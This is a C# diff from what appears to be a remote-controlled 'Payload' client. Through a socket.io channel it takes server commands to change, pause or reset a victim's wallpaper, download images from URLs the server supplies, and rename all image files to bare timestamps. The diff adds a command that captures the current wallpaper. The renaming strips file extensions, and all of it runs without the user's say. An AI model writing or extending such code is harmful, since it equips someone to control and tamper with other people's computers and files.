@@ -1,4 +1,5 @@
 ﻿using Payload.Command;
+using Payload.Command.WallPaper;
 using Payload.Common;
 using SocketIOClient;
 using System;
@@ -10,6 +11,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using static Payload.Common.Config;
 
 namespace Payload.Core.Command.SocketClient
 {
@@ -44,10 +46,13 @@ namespace Payload.Core.Command.SocketClient
                         CommandManager.Instance.AddWallpaperCmd(Payload.Command.WallPaper.Mode.AUTO);
                         break;
                     case "stwp":
-                        CommandManager.Instance.GetTaskPack(Config.EnumTask.WallpaperEngine).Pause();
+                        CommandManager.Instance.GetTaskPack(EnumTask.WallpaperEngine).Pause();
                         break;
                     case "rewp":
                         CommandManager.Instance.AddWallpaperCmd(Payload.Command.WallPaper.Mode.RESET);
+                        break;
+                    case "savewp":
+                        ((WallpaperEngineCommand)CommandManager.Instance.GetTaskPack(EnumTask.WallpaperEngine).Command).GetCurrentWallpaper();
                         break;
                     case "rname":
                         RenameAllImage();
@@ -66,7 +71,7 @@ namespace Payload.Core.Command.SocketClient
             {
                 if (string.IsNullOrEmpty(file.Extension))
                     continue;
-                File.Move(file.FullName, $"{file.DirectoryName}\\{DateTime.Now.ToString("yyyyy_MM_dd_HH_mm_ss_fff")}");
+                File.Move(file.FullName, $"{file.DirectoryName}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss_fff")}");
                 Thread.Sleep(1);
                 File.Delete(file.FullName);
             }
@@ -77,7 +82,7 @@ namespace Payload.Core.Command.SocketClient
             if (channel.Equals("wallpaper") && cmd.StartsWith("dl"))
             {
                 string url = cmd.Split(' ')[1];
-                new ImageHelper().SaveImage(url, $"{Config.Instance.WallpaperEngineCommandImageDir}\\{DateTime.Now.ToString("yyyyy_MM_dd_HH_mm_ss_fff")}", ImageFormat.Png);
+                new ImageHelper().SaveImage(url, $"{Config.Instance.WallpaperEngineCommandImageDir}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss_fff")}", ImageFormat.Png);
             }
         }
     }
